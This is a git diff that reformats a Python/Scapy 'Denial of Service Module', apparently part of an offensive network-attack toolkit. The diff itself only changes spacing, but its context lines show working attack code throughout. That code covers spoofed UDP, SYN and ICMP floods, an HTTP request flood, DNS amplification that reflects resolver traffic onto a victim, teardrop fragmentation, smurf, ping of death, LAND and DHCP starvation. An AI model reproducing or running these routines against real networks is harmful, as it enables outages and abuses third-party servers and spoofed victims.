@@ -27,8 +27,7 @@ import threading
 import requests
 
 
-class Doser(object):
-
+class DOSer(object):
     name = "Denial of Service Module."
     desc = "Denial of service attacks here."
     version = "1.2"
@@ -39,7 +38,7 @@ class Doser(object):
         self.synstop = False
         self.udpstop = False
 
-    def dnsdropstart(self,host):
+    def dnsdropstart(self, host):
         os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
         self.host = host
         try:
@@ -73,8 +72,8 @@ class Doser(object):
 
         try:
             print "[+] UDP flood denial of service initialized on port: {}.".format(dport)
-            for i in range(0,3):
-                u = threading.Thread(name='udpflood',target=self.udpflood)
+            for i in range(0, 3):
+                u = threading.Thread(name='udpflood', target=self.udpflood)
                 u.setDaemon(True)
                 u.start()
             self.udpflood()
@@ -84,8 +83,8 @@ class Doser(object):
     def udpflood(self):
         try:
             IP_layer = IP(src=self.src, dst=self.tgt)
-            UDP_layer = UDP(sport=1337,dport=self.dport)
-            pkt = IP_layer/UDP_layer
+            UDP_layer = UDP(sport=1337, dport=self.dport)
+            pkt = IP_layer / UDP_layer
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] UDP flood denial of service finalized."
             exit(0)
@@ -99,7 +98,7 @@ class Doser(object):
 
         try:
             print "[+] SYN flood denial of service initialized."
-            for i in range(0,3):
+            for i in range(0, 3):
                 s = threading.Thread(name='synflood', target=self.synflood)
                 s.setDaemon(True)
                 s.start()
@@ -110,14 +109,13 @@ class Doser(object):
     def synflood(self):
         try:
             IP_layer = IP(src=self.src, dst=self.tgt)
-            TCP_layer = TCP(sport=1337,dport=self.dport)
-            pkt = IP_layer/TCP_layer
+            TCP_layer = TCP(sport=1337, dport=self.dport)
+            pkt = IP_layer / TCP_layer
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] SYN flood denial of service finalized."
             exit(0)
         except Exception as e:
             print "[!] Error: {}".format(e)
-
 
     def icmpfloodstart(self, host, tgt):
         self.src = host
@@ -125,7 +123,7 @@ class Doser(object):
 
         try:
             print "[+] ICMP flood denial of service initialized."
-            for x in range(0,3):
+            for x in range(0, 3):
                 i = threading.Thread(name='icmpflood', target=self.icmpflood)
                 i.setDaemon(True)
                 i.start()
@@ -137,7 +135,7 @@ class Doser(object):
         try:
             IP_layer = IP(src=self.src, dst=self.tgt)
             ICMP_layer = ICMP()
-            pkt = IP_layer/ICMP_layer
+            pkt = IP_layer / ICMP_layer
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] ICMP flood denial of service finalized."
             exit(0)
@@ -150,7 +148,7 @@ class Doser(object):
         raw_input = "Only GET method are supported, other methods will be implemented on the next version."
         while True:
             i += 1
-            sys.stdout.write("\r"+"[+] Requests: ["+str(i)+"]")
+            sys.stdout.write("\r" + "[+] Requests: [" + str(i) + "]")
             sys.stdout.flush()
             try:
                 requests.get(tgt)
@@ -169,8 +167,8 @@ class Doser(object):
 
         try:
             print "[+] DNS Amplification denial of service initialized."
-            for x in range(0,3):
-                i = threading.Thread(name="dnsamp",target=self.dnsamplification)
+            for x in range(0, 3):
+                i = threading.Thread(name="dnsamp", target=self.dnsamplification)
                 i.setDaemon(True)
                 i.start()
             self.dnsamplification()
@@ -184,41 +182,41 @@ class Doser(object):
         try:
             while True:
                 for server in self.dnsservers:
-                    pkt = IP(dst=server, src=self.tgt)/\
-                            UDP(dport=53, sport=RandNum(1024,65535))/\
-                            DNS(rd=1,qd=DNSQR(qname="www.google.com",qtype="ALL",qclass="IN"))
+                    pkt = IP(dst=server, src=self.tgt) / \
+                          UDP(dport=53, sport=RandNum(1024, 65535)) / \
+                          DNS(rd=1, qd=DNSQR(qname="www.google.com", qtype="ALL", qclass="IN"))
                     send(pkt, inter=0.0, verbose=False)
         except Exception as e:
             print "[!] Error: {}".format(e)
 
-    def teardrop(self,target):
-        #First packet
+    def teardrop(self, target):
+        # First packet
         try:
             size = input("[+] First fragment packet size: ")
-            offset= input("[+] First fragment packet offset: ")
+            offset = input("[+] First fragment packet offset: ")
         except Exception as e:
             print "[!] Error: {}".format(e)
             return
 
-        load1="\x00"*size
-        IP_one = IP(dst = target, flags="MF", proto=17, frag = offset)
+        load1 = "\x00" * size
+        IP_one = IP(dst=target, flags="MF", proto=17, frag=offset)
 
-        #Second packet
+        # Second packet
         try:
-            size= input("[+] Second fragment packet size: ")
-            offset= input("[+] Second fragment packet offset: ")
+            size = input("[+] Second fragment packet size: ")
+            offset = input("[+] Second fragment packet offset: ")
         except Exception as e:
             print "[!] Error: {}".format(e)
             return
 
-        load2="\x00"*size
-        IP_two = IP(dst = target, flags=0, proto=17, frag=offset)
+        load2 = "\x00" * size
+        IP_two = IP(dst=target, flags=0, proto=17, frag=offset)
 
         print "[+] Teardrop UDP fragmentation denial of service initialized."
         while True:
             try:
-                send(IP_one/load1,verbose=False)
-                send(IP_two/load2,verbose=False)
+                send(IP_one / load1, verbose=False)
+                send(IP_two / load2, verbose=False)
             except KeyboardInterrupt:
                 print "[-] Teardrop UDP fragmentation denial of service finalized."
                 break
@@ -228,42 +226,39 @@ class Doser(object):
         try:
             multicast = raw_input("[+] IP Address to send echo-requests: ")
             print "[+] ICMP smurf denial of service initialized."
-            for x in range(0,3):
-                i2 = threading.Thread(name='icmpsmurf',target=self.icmpsmurf)
+            for x in range(0, 3):
+                i2 = threading.Thread(name='icmpsmurf', target=self.icmpsmurf)
                 i2.setDaemon(True)
                 i2.start
             self.icmpsmurf()
         except:
             print "[!] Error: check the parameters (target)"
 
-
     def icmpsmurf(self):
         try:
-            IP_layer = IP(src=self.tgt,dst=ip)
+            IP_layer = IP(src=self.tgt, dst=ip)
             ICMP_layer = ICMP()
-            pkt = IP_layer/ICMP_layer
+            pkt = IP_layer / ICMP_layer
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] ICMP smurf denial of service finalized."
             exit(0)
         except Exception as e:
             print "[!] Error: {}".format(e)
 
-
-
     def pingofdeath(self):
         try:
-            pkt = fragment(IP(dst=self.tgt)/ICMP()/("X"*60000))
+            pkt = fragment(IP(dst=self.tgt) / ICMP() / ("X" * 60000))
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] Ping Of Death finalized."
             exit(0)
         except Exception as e:
             pass
 
-    def pingofdeathstart(self,target):
+    def pingofdeathstart(self, target):
         self.tgt = target
         try:
             print "[+] Ping of Death denial of service initialized."
-            for x in range(0,3):
+            for x in range(0, 3):
                 i = threading.Thread(name='pingofdeath', target=self.pingofdeath)
                 i.setDaemon(True)
                 i.start()
@@ -271,14 +266,13 @@ class Doser(object):
         except Exception as e:
             print "[!] Exception caught: {}".format(e)
 
-
-    def landstart(self,target,port):
+    def landstart(self, target, port):
         self.tgt = target
         self.port = port
 
         try:
             print "[+] LAND attack denial of service initialized."
-            for x in range(0,3):
+            for x in range(0, 3):
                 i = threading.Thread(name='land', target=self.land)
                 i.setDaemon(True)
                 i.start()
@@ -288,7 +282,7 @@ class Doser(object):
 
     def land(self):
         try:
-            pkt = IP(src=self.tgt,dst=self.tgt)/TCP(sport=self.port)
+            pkt = IP(src=self.tgt, dst=self.tgt) / TCP(sport=self.port)
             send(pkt, loop=1, inter=0.0, verbose=False)
             print "[-] LAND attack finalized."
             exit(0)
@@ -302,12 +296,13 @@ class Doser(object):
         except Exception as e:
             print "[!] Exception caught: {}".format(e)
 
-
-
     def dhcpstarvation(self):
         try:
             conf.checkIPaddr = False
-            dhcp_discover =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
+            dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",
+                                                                               dst="255.255.255.255") / UDP(sport=68,
+                                                                                                            dport=67) / BOOTP(
+                chaddr=RandString(12, '0123456789abcdef')) / DHCP(options=[("message-type", "discover"), "end"])
 
             try:
                 sendp(dhcp_discover, loop=1, inter=0.0, verbose=False)
@@ -318,5 +313,3 @@ class Doser(object):
             exit(0)
         except Exception as e:
             pass
-
-
